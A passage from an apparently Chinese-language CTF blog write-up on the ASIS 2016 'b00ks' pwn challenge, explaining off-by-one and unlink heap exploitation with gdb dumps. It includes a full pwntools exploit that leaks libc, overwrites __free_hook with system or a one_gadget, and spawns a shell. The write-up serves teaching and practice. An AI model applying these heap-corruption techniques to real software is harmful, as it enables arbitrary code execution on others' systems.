class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555b3bed9090</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555b3bed90a0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555b3bed90b0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555b3bed90c0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555b3bed90d0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br></pre></td></tr></table></figure><h5 id="创建堆块1"><a href="#创建堆块1" class="headerlink" title="创建堆块1"></a>创建堆块1</h5><p>相信我，这里是这道题最难的地方，过了这个坎就很简单了，每个人环境不同，处理的结果也不一样，所以自行调试，在这里我能给你的建议就是将description申请大一点，泄露部分不需要这里大小控制，先不讲，你先调试到能泄露就行</p><h5 id="泄露地址"><a href="#泄露地址" class="headerlink" title="泄露地址"></a>泄露地址</h5><p>这个不多讲</p><h5 id="通过edit伪造book结构体"><a href="#通过edit伪造book结构体" class="headerlink" title="通过edit伪造book结构体"></a>通过edit伪造book结构体</h5><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload =  <span class="string">'a'</span>*<span class="number">0xa0</span> + p64(<span class="number">1</span>) + p64(first_heap + <span class="number">0x38</span>) + p64(first_heap + <span class="number">0x40</span>) + p64(<span class="number">0xffff</span>)</span><br><span class="line">edit(<span class="number">1</span>, payload)</span><br></pre></td></tr></table></figure><p>这前面的偏移是看个人环境的，网上的很多没有偏移，在我电脑环境上做不到，我通过这个偏移能刚好对齐，具体调试过程就是繁杂的了，总之，你要让你覆盖掉堆块1的地址那部分，刚好在book1的description指针指向的空间里，这样你才能自行伪造结构体<br>比如<br>我泄露出来的第一个堆块地址为这个[+] first_heap: 0x55b6b5d72160<br>那这时候我覆盖过后地址就变成[+] first_heap: 0x55b6b5d72100，你要让0x55b6b5d72100在description指向的空间内就成了，建议将description申请的大一些，这样容易做到，这部分跟创建堆块1是结合起来的，你看我创建的大小在你那不一定准确</p><h5 id="这时候再次利用off-by-one"><a href="#这时候再次利用off-by-one" class="headerlink" title="这时候再次利用off by one"></a>这时候再次利用off by one</h5><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">author_name(<span class="string">"author"</span>.rjust(<span class="number">0x20</span>,<span class="string">'a'</span>))</span><br></pre></td></tr></table></figure><p>将地址最低位覆盖成\x00,这样我们我们的那个堆块1的指针就指向了我们自己伪造的结构体了，这个结构体description和name我们指向了book2结构体，这样我们通过编辑堆块1的description就能改掉book2的结构体的description指针和name指针，我们能编辑book2的description，相当于任意写了</p><h5 id="这里部分就只是泄露了"><a href="#这里部分就只是泄露了" class="headerlink" title="这里部分就只是泄露了"></a>这里部分就只是泄露了</h5><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">book_id_1, book_name, book_des, book_author = printbook(<span class="number">1</span>)</span><br><span class="line">book2_name_addr = u64(book_name.ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">book2_des_addr = u64(book_des.ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line">io.success(<span class="string">"book2 name addr: 0x%x"</span> % book2_name_addr)</span><br><span class="line">io.success(<span class="string">"book2 des addr: 0x%x"</span> % book2_des_addr)</span><br><span class="line">libc_base = book2_des_addr - <span class="number">0x5a8010</span></span><br><span class="line">io.success(<span class="string">"libc_base: 0x%x"</span> % libc_base)</span><br><span class="line">free_hook = libc_base + libc.symbols[<span class="string">'__free_hook'</span>]</span><br><span class="line">offset = <span class="number">0x45216</span> </span><br><span class="line">offset = <span class="number">0x4526a</span> </span><br><span class="line"><span class="comment">#offset = 0xf02a4 </span></span><br><span class="line"><span class="comment">#offset = 0xf1147</span></span><br><span class="line">one_gadget = libc_base + offset</span><br><span class="line">io.success(<span class="string">"free_hook addr: 0x%x"</span> % free_hook)</span><br><span class="line">io.success(<span class="string">"one_gadget addr: 0x%x"</span> % one_gadget)</span><br></pre></td></tr></table></figure><p>这里那个固定偏移，第一部分libc_base我是通过vmmap获得libc基地址，然后我调试的时候减一下就获得这个固定偏移了</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">gdb-peda$ vmmap</span><br><span class="line">Start              End                Perm	Name</span><br><span class="line"><span class="number">0x0000564350ee5000</span> <span class="number">0x0000564350ee7000</span> r-xp	/tmp/pwn/b00ks_debug</span><br><span class="line"><span class="number">0x00005643510e6000</span> <span class="number">0x00005643510e7000</span> r--p	/tmp/pwn/b00ks_debug</span><br><span class="line"><span class="number">0x00005643510e7000</span> <span class="number">0x00005643510e8000</span> rw-p	/tmp/pwn/b00ks_debug</span><br><span class="line"><span class="number">0x0000564351cdd000</span> <span class="number">0x0000564351cff000</span> rw-p	[heap]</span><br><span class="line"><span class="number">0x00007f2805862000</span> <span class="number">0x00007f2805a22000</span> r-xp	/home/NoOne-hub/Desktop/heap/off_by_one/Asis_2016_b00ks/libc.so<span class="number">.6</span></span><br><span class="line"><span class="number">0x00007f2805a22000</span> <span class="number">0x00007f2805c22000</span> ---p	/home/NoOne-hub/Desktop/heap/off_by_one/Asis_2016_b00ks/libc.so<span class="number">.6</span></span><br><span class="line"><span class="number">0x00007f2805c22000</span> <span class="number">0x00007f2805c26000</span> r--p	/home/NoOne-hub/Desktop/heap/off_by_one/Asis_2016_b00ks/libc.so<span class="number">.6</span></span><br><span class="line"><span class="number">0x00007f2805c26000</span> <span class="number">0x00007f2805c28000</span> rw-p	/home/NoOne-hub/Desktop/heap/off_by_one/Asis_2016_b00ks/libc.so<span class="number">.6</span></span><br><span class="line"><span class="number">0x00007f2805c28000</span> <span class="number">0x00007f2805c2c000</span> rw-p	mapped</span><br><span class="line"><span class="number">0x00007f2805c2c000</span> <span class="number">0x00007f2805c52000</span> r-xp	/tmp/ld.so<span class="number">.2</span></span><br><span class="line"><span class="number">0x00007f2805e0a000</span> <span class="number">0x00007f2805e51000</span> rw-p	mapped</span><br><span class="line"><span class="number">0x00007f2805e51000</span> <span class="number">0x00007f2805e52000</span> r--p	/tmp/ld.so<span class="number">.2</span></span><br><span class="line"><span class="number">0x00007f2805e52000</span> <span class="number">0x00007f2805e53000</span> rw-p	/tmp/ld.so<span class="number">.2</span></span><br><span class="line"><span class="number">0x00007f2805e53000</span> <span class="number">0x00007f2805e54000</span> rw-p	mapped</span><br><span class="line"><span class="number">0x00007ffd06df4000</span> <span class="number">0x00007ffd06e15000</span> rw-p	[<span class="built_in">stack</span>]</span><br><span class="line"><span class="number">0x00007ffd06edc000</span> <span class="number">0x00007ffd06edf000</span> r--p	[vvar]</span><br><span class="line"><span class="number">0x00007ffd06edf000</span> <span class="number">0x00007ffd06ee1000</span> r-xp	[vdso]</span><br></pre></td></tr></table></figure><p>在heap下面权限为r-xp的start部分的地址就是libc基地址了，<br>然后任选一个泄露的<br>[+] book2 name addr: 0x7f2805e2c010<br>[+] book2 des addr: 0x7f2805e0a010<br>我选了description部分的</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">└──╼ $python</span><br><span class="line">Python <span class="number">2.7</span><span class="number">.16</span> (<span class="keyword">default</span>, Apr  <span class="number">6</span> <span class="number">2019</span>, <span class="number">01</span>:<span class="number">42</span>:<span class="number">57</span>) </span><br><span class="line">[GCC <span class="number">8.3</span><span class="number">.0</span>] on linux2</span><br><span class="line">Type <span class="string">"help"</span>, <span class="string">"copyright"</span>, <span class="string">"credits"</span> <span class="keyword">or</span> <span class="string">"license"</span> <span class="keyword">for</span> more information.</span><br><span class="line">&gt;&gt;&gt; hex(<span class="number">0x7f2805e0a010</span><span class="number">-0x00007f2805862000</span>)</span><br><span class="line">'0x5a8010'</span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure><p>就是这个固定偏移了</p><p>至于libc跟one_gadget偏移，用工具吧one_gadget</p><h5 id="最后任意地址写"><a href="#最后任意地址写" class="headerlink" title="最后任意地址写"></a>最后任意地址写</h5><ol><li>先编辑book1的description改成free_hook地址，就是将book2的description指针指向free_hook</li><li>编辑book2的description，就是写入one_gadget了</li><li>最后在调用一次free就可以getshell了<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = p64(free_hook)</span><br><span class="line">edit(<span class="number">1</span>, payload)</span><br><span class="line">edit(<span class="number">2</span>, p64(one_gadget))</span><br><span class="line">remove(<span class="number">2</span>)</span><br></pre></td></tr></table></figure></li></ol><h4 id="unlink原理"><a href="#unlink原理" class="headerlink" title="unlink原理"></a>unlink原理</h4><p>void unlink(malloc_chunk *P, malloc_chunk *BK, malloc_chunk *FD)</p><p>{</p><pre><code>FD = P-&gt;fd;

BK = P-&gt;bk;

FD-&gt;bk = BK;

BK-&gt;fd = FD;</code></pre><p>}<br><span class="exturl" data-url="aHR0cHM6Ly9jdGYtd2lraS5naXRodWIuaW8vY3RmLXdpa2kvcHduL2xpbnV4L2dsaWJjLWhlYXAvdW5saW5rLXpoLw==" title="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/unlink-zh/">ctf-wiki讲解原理<i class="fa fa-external-link"></i></span><br>我觉得那张图配的十分好，就是双向链表的解链过程，好好理解，不理解没法搞下去</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">chunk</span>&#123;</span></span><br><span class="line">    <span class="keyword">int</span> pre_size;</span><br><span class="line">    <span class="keyword">int</span> size;</span><br><span class="line">    <span class="keyword">char</span> *fd; <span class="comment">//前驱指针 forward</span></span><br><span class="line">    <span class="keyword">char</span> *bk; <span class="comment">// 后继指针 back</span></span><br><span class="line">    数据部分</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>大概就是这样，我创建三个这个结构体，a,b,c连接部分如下图，<br>链表： a&lt;-&gt;b&lt;-&gt;c<br>将b从链表中解链就是unlink<br>过程：</p><ol><li>FD = b-&gt;fd; //实际就是FD=a</li><li>BK = b-&gt;bk; //实际就是BK=c</li><li>FD-&gt;bk = BK; //就是从a-&gt;b变成a-&gt;c</li><li>BK-&gt;fd = FD; //就是从c-&gt;b变成c-&gt;a</li></ol><p>那unlink为什么能利用，进行攻击呢？我也纠结了这个很久，从ctf-wiki上了解的过去的unlink就不讲了，那时候的攻击方式比较简单，我只讲现今的unlink攻击方式<br>我们可以通过伪造chunk，让他解链的时候unlink一个我们伪造的chunk，这样的话，我们实际就达到了一个赋值的效果，而具体的效果从例子中讲解吧</p><h5 id="unlink攻击过程"><a href="#unlink攻击过程" class="headerlink" title="unlink攻击过程"></a>unlink攻击过程</h5><ol><li>利用off-by-one覆盖掉结果的null字节，泄露第一个堆块的地址</li><li>泄露掉后利用unlink，使得堆块4的mem部分的指针指向ptr-0x18处，ptr-0x18为自定义的地址，其实就是堆块4，就是create出来的那个堆块</li><li>覆盖堆块4的内容，修改了堆块4的description的指针，指向了堆块6的description部分的指针</li><li>其实第三部分就相当于获得了一个任意地址读写的指针</li><li>这里有好几次修改容易绕晕，我绕了两天才绕出来，第一次修改的时候是将chunk4整体改写，从开头到description指针，全部改掉，将chunk4的description指向chunk6结构体的description</li><li>然后第二次编辑的时候就是编辑chunk6结构体的description，这样就可以修改chunk6的description指针指向任意地点</li><li>利用这个特性输出，输出了libc的地址，具体libc在哪个位置可以通过调试得到</li><li>利用这个特性任意地址写<br>先对整体过程有个大概的了解，在一步步讲</li></ol><h5 id="过程中的坑"><a href="#过程中的坑" class="headerlink" title="过程中的坑"></a>过程中的坑</h5><ol><li>开头remove两次是有原因的，这样会让堆块6的结构体在前面几个堆块内，因为堆块同样大小的在free过后在malloc后会再次利用，这样方便我们自己调试查看以及利用</li><li>调试时候的计算问题，可以用你当时调试出来的减去后两位数字，获得个heap_base这样直接利用heap_base + 偏移比较快计算结果</li><li>当申请不是16的整数倍的时候，他会转换成16的整数倍，比如我exp中的0x108，实际大小会变成111，还有个1是标记的，他会将下一个chunk的pre_size拿来使用，因为没有free的话，pre_size是没用的，为了不浪费空间，就使用了</li></ol><h5 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h5><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> PwnContext.core <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># Set up pwntools for the correct architecture</span></span><br><span class="line">elf = context.binary = ELF(<span class="string">'b00ks'</span>)</span><br><span class="line"></span><br><span class="line">LIBC = args.LIBC <span class="keyword">or</span> <span class="string">'libc.so.6'</span></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">host = args.HOST <span class="keyword">or</span> <span class="string">'127.0.0.1'</span></span><br><span class="line">port = int(args.PORT <span class="keyword">or</span> <span class="number">1080</span>)</span><br><span class="line">ctx.binary = <span class="string">'b00ks'</span></span><br><span class="line">ctx.remote_libc = LIBC</span><br><span class="line">ctx.debug_remote_libc = <span class="literal">True</span></span><br><span class="line"><span class="keyword">if</span> ctx.debug_remote_libc == <span class="literal">False</span>:</span><br><span class="line">    libc = elf.libc</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    libc = ctx.remote_libc</span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    context.log_level = <span class="string">'debug'</span></span><br><span class="line">    io = ctx.start()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(host,port)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span><span class="params">(choice)</span>:</span></span><br><span class="line">    io.recvuntil(<span class="string">"&gt;"</span>)</span><br><span class="line">    io.sendline(str(choice))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span><span class="params">(book_size, book_name, desc_size, desc)</span>:</span></span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">": "</span>, str(book_size))</span><br><span class="line">    io.recvuntil(<span class="string">": "</span>)</span><br><span class="line">    <span class="keyword">if</span> len(book_name) == book_size:<span class="comment">#deal with overflow</span></span><br><span class="line">        io.send(book_name)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        io.sendline(book_name)</span><br><span class="line">    io.recvuntil(<span class="string">": "</span>)</span><br><span class="line">    io.sendline(str(desc_size))</span><br><span class="line">    <span class="keyword">if</span> len(desc) == desc_size:</span><br><span class="line">        io.send(desc)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        io.sendline(desc)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">remove</span><span class="params">(idx)</span>:</span></span><br><span class="line">    cmd(<span class="number">2</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">": "</span>, str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx, desc)</span>:</span></span><br><span class="line">    cmd(<span class="number">3</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">": "</span>, str(idx))</span><br><span class="line">    io.sendlineafter(<span class="string">": "</span>, str(desc))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">printf</span><span class="params">()</span>:</span></span><br><span class="line">    cmd(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">author_name</span><span class="params">(name)</span>:</span></span><br><span class="line">    cmd(<span class="number">5</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">": "</span>, str(name))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">": "</span>, <span class="string">"author"</span>.rjust(<span class="number">0x20</span>,<span class="string">'a'</span>))</span><br><span class="line">    create(<span class="number">0x20</span>, <span class="string">'11111'</span>, <span class="number">0x20</span>, <span class="string">'b'</span>) <span class="comment">#1</span></span><br><span class="line">    printf()</span><br><span class="line">    io.recvuntil(<span class="string">'Author: '</span>)</span><br><span class="line">    io.recvuntil(<span class="string">"author"</span>)</span><br><span class="line">    first_heap = u64(io.recvline().strip().ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line">    create(<span class="number">0x20</span>, <span class="string">"22222"</span>, <span class="number">0x20</span>, <span class="string">"desc buf"</span>) <span class="comment">#2</span></span><br><span class="line">    create(<span class="number">0x20</span>, <span class="string">"33333"</span>, <span class="number">0x20</span>, <span class="string">"desc buf"</span>) <span class="comment">#3</span></span><br><span class="line">    remove(<span class="number">2</span>)</span><br><span class="line">    remove(<span class="number">3</span>)</span><br><span class="line">    create(<span class="number">0x20</span>, <span class="string">"33333"</span>, <span class="number">0x108</span>, <span class="string">'overflow'</span>) <span class="comment">#4</span></span><br><span class="line">    create(<span class="number">0x20</span>, <span class="string">"44444"</span>, <span class="number">0x100</span><span class="number">-0x10</span>, <span class="string">'target'</span>) <span class="comment">#5</span></span><br><span class="line">    create(<span class="number">0x20</span>, <span class="string">"/bin/sh\x00"</span>, <span class="number">0x200</span>, <span class="string">'to arbitrary read and write'</span>) <span class="comment">#6</span></span><br><span class="line">    heap_base = first_heap - <span class="number">0x80</span></span><br><span class="line">    ptr = heap_base + <span class="number">0x180</span></span><br><span class="line">    payload = p64(<span class="number">0</span>) + p64(<span class="number">0x101</span>) + p64(ptr<span class="number">-0x18</span>) + p64(ptr<span class="number">-0x10</span>) + <span class="string">'\x00'</span>*<span class="number">0xe0</span> + p64(<span class="number">0x100</span>)</span><br><span class="line">    edit(<span class="number">4</span>, payload)</span><br><span class="line">    remove(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">    payload = p64(<span class="number">0x30</span>) + p64(<span class="number">4</span>) + p64(first_heap+<span class="number">0x40</span>)*<span class="number">2</span></span><br><span class="line">    edit(<span class="number">4</span>, payload)</span><br><span class="line">    edit(<span class="number">4</span>, p64(heap_base + <span class="number">0x1e0</span>))</span><br><span class="line">    printf()</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">3</span>):</span><br><span class="line">        io.recvuntil(<span class="string">'Description: '</span>)</span><br><span class="line">    content = io.recvline()</span><br><span class="line">    io.info(content)</span><br><span class="line">    libc_base = u64(content.strip().ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))<span class="number">-0x3c4b78</span></span><br><span class="line">    io.success(<span class="string">"libc_base: 0x%x"</span> % libc_base)</span><br><span class="line">    system_addr = libc_base + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">    io.success(<span class="string">'system: 0x%x'</span> % system_addr)</span><br><span class="line">    free_hook = libc_base + libc.symbols[<span class="string">'__free_hook'</span>]</span><br><span class="line">    payload = p64(free_hook) + p64(<span class="number">0x200</span>)</span><br><span class="line">    edit(<span class="number">4</span>, payload)</span><br><span class="line">    edit(<span class="number">6</span>, p64(system_addr))</span><br><span class="line">    io.success(<span class="string">'first_heap: 0x%x'</span> % first_heap)</span><br><span class="line">    remove(<span class="number">6</span>)</span><br><span class="line">    <span class="comment">#gdb.attach(io)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    exp()</span><br><span class="line">    io.interactive()</span><br></pre></td></tr></table></figure><p>同样，我只讲解exp部分的内容，其余一样是准备工作</p><h5 id="填充并泄露堆块1地址"><a href="#填充并泄露堆块1地址" class="headerlink" title="填充并泄露堆块1地址"></a>填充并泄露堆块1地址</h5><p>一样的过程，利用off-by-one泄露地址，不讲了，只讲重点</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">io.sendlineafter(<span class="string">": "</span>, <span class="string">"author"</span>.rjust(<span class="number">0x20</span>,<span class="string">'a'</span>))</span><br><span class="line">create(<span class="number">0x20</span>, <span class="string">'11111'</span>, <span class="number">0x20</span>, <span class="string">'b'</span>) <span class="comment">#1</span></span><br><span class="line">printf()</span><br><span class="line">io.recvuntil(<span class="string">'Author: '</span>)</span><br><span class="line">io.recvuntil(<span class="string">"author"</span>)</span><br><span class="line">first_heap = u64(io.recvline().strip().ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br></pre></td></tr></table></figure><h5 id="创建堆块并remove掉"><a href="#创建堆块并remove掉" class="headerlink" title="创建堆块并remove掉"></a>创建堆块并remove掉</h5><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">create(<span class="number">0x20</span>, <span class="string">"22222"</span>, <span class="number">0x20</span>, <span class="string">"desc buf"</span>) <span class="comment">#2</span></span><br><span class="line">create(<span class="number">0x20</span>, <span class="string">"33333"</span>, <span class="number">0x20</span>, <span class="string">"desc buf"</span>) <span class="comment">#3</span></span><br><span class="line">remove(<span class="number">2</span>)</span><br><span class="line">remove(<span class="number">3</span>)</span><br></pre></td></tr></table></figure><p>这里是要将book6的结构体位置放到前面，方便利用，你可以自己去调试试试，不这样做的话，位置很难找，因为他定义的存储这个结构体的大小也是0x20+0x10(数据部分+结构部分)</p><h5 id="unlink部分-重点"><a href="#unlink部分-重点" class="headerlink" title="unlink部分(重点)"></a>unlink部分(重点)</h5><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">create(<span class="number">0x20</span>, <span class="string">"33333"</span>, <span class="number">0x108</span>, <span class="string">'overflow'</span>) <span class="comment">#4</span></span><br><span class="line">create(<span class="number">0x20</span>, <span class="string">"44444"</span>, <span class="number">0x100</span><span class="number">-0x10</span>, <span class="string">'target'</span>) <span class="comment">#5</span></span><br><span class="line">create(<span class="number">0x20</span>, <span class="string">"/bin/sh\x00"</span>, <span class="number">0x200</span>, <span class="string">'to arbitrary read and write'</span>) <span class="comment">#6</span></span><br><span class="line">heap_base = first_heap - <span class="number">0x80</span></span><br><span class="line">ptr = heap_base + <span class="number">0x180</span></span><br><span class="line">payload = p64(<span class="number">0</span>) + p64(<span class="number">0x101</span>) + p64(ptr<span class="number">-0x18</span>) + p64(ptr<span class="number">-0x10</span>) + <span class="string">'\x00'</span>*<span class="number">0xe0</span> + p64(<span class="number">0x100</span>)</span><br><span class="line">edit(<span class="number">4</span>, payload)</span><br><span class="line">remove(<span class="number">5</span>)</span><br></pre></td></tr></table></figure><ol><li>创建两个smallchunk，因为unlink只有在smallbin下才可以，fastbin不行</li><li>最后一个chunk是用来编辑的，以及free的，free的参数要带/bin/sh，就是要将他改写成system函数</li><li>heap_base = first_heap - 0x80这个偏移自己定，每次调试可能都不一样，反正只要对的上你自己调试的时候就行，方便自己计算，我这里调试的时候是<br>[+] first_heap: 0x56182d174080所以减了0x80</li></ol><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">gdb-peda$ x/<span class="number">50</span>gx <span class="number">0x5653ee7a5080</span></span><br><span class="line"><span class="number">0x5653ee7a5080</span>:	<span class="number">0x0000000000000001</span>	<span class="number">0x00005653ee7a5020</span></span><br><span class="line"><span class="number">0x5653ee7a5090</span>:	<span class="number">0x00005653ee7a5050</span>	<span class="number">0x0000000000000020</span></span><br><span class="line"><span class="number">0x5653ee7a50a0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000031</span></span><br><span class="line"><span class="number">0x5653ee7a50b0</span>:	<span class="number">0x0000000000000006</span>	<span class="number">0x00005653ee7a50e0</span></span><br><span class="line"><span class="number">0x5653ee7a50c0</span>:	<span class="number">0x00005653ee7a53e0</span>	<span class="number">0x0000000000000200</span></span><br><span class="line"><span class="number">0x5653ee7a50d0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000031</span></span><br><span class="line"><span class="number">0x5653ee7a50e0</span>:	<span class="number">0x0068732f6e69622f</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5653ee7a50f0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5653ee7a5100</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000031</span></span><br><span class="line"><span class="number">0x5653ee7a5110</span>:	<span class="number">0x0000565300000005</span>	<span class="number">0x00005653ee7a5140</span></span><br><span class="line"><span class="number">0x5653ee7a5120</span>:	<span class="number">0x00005653ee7a52e0</span>	<span class="number">0x00000000000000f0</span></span><br><span class="line"><span class="number">0x5653ee7a5130</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000031</span></span><br><span class="line"><span class="number">0x5653ee7a5140</span>:	<span class="number">0x0000003434343434</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5653ee7a5150</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5653ee7a5160</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000031</span></span><br><span class="line"><span class="number">0x5653ee7a5170</span>:	<span class="number">0x0000565300000004</span>	<span class="number">0x00005653ee7a51a0</span></span><br><span class="line"><span class="number">0x5653ee7a5180</span>:	<span class="number">0x00005653ee7a51d0</span>	<span class="number">0x0000000000000108</span></span><br><span class="line"><span class="number">0x5653ee7a5190</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000031</span></span><br><span class="line"><span class="number">0x5653ee7a51a0</span>:	<span class="number">0x0000003333333333</span>	<span class="number">0x00005653ee7a5140</span></span><br><span class="line"><span class="number">0x5653ee7a51b0</span>:	<span class="number">0x00005653ee7a5170</span>	<span class="number">0x0000000000000020</span></span><br><span class="line"><span class="number">0x5653ee7a51c0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000111</span> #chunk4</span><br><span class="line"><span class="number">0x5653ee7a51d0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000101</span> #实际可以写部分</span><br><span class="line"><span class="number">0x5653ee7a51e0</span>:	<span class="number">0x00005653ee7a5168</span>	<span class="number">0x00005653ee7a5170</span></span><br><span class="line"><span class="number">0x5653ee7a51f0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5653ee7a5200</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br></pre></td></tr></table></figure><p>这是我显示first_heap后的数据，0x5653ee7a51d0便是申请的0x108的chunk，我在这里伪造了一个chunk，fd和bk在0x5653ee7a51e0，然后通过溢出将下个chunk的pre_size改成我这个伪造的chunk大小<br>在看看相邻的堆块</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">gdb-peda$ x/<span class="number">50</span>gx <span class="number">0x5653ee7a51c0</span></span><br><span class="line"><span class="number">0x5653ee7a51c0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000111</span></span><br><span class="line"><span class="number">0x5653ee7a51d0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000101</span> #伪造的chunk记为p</span><br><span class="line"><span class="number">0x5653ee7a51e0</span>:	<span class="number">0x00005653ee7a5168</span>	<span class="number">0x00005653ee7a5170</span></span><br><span class="line"><span class="number">0x5653ee7a51f0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5653ee7a5200</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5653ee7a5210</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5653ee7a5220</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5653ee7a5230</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5653ee7a5240</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5653ee7a5250</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5653ee7a5260</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5653ee7a5270</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5653ee7a5280</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5653ee7a5290</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5653ee7a52a0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5653ee7a52b0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5653ee7a52c0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5653ee7a52d0</span>:	<span class="number">0x0000000000000100</span>	<span class="number">0x0000000000000100</span> #chunk5</span><br><span class="line"><span class="number">0x5653ee7a52e0</span>:	<span class="number">0x0000746567726174</span>	<span class="number">0x0000000000000000</span> #实际可以写部分</span><br><span class="line"><span class="number">0x5653ee7a52f0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5653ee7a5300</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5653ee7a5310</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span 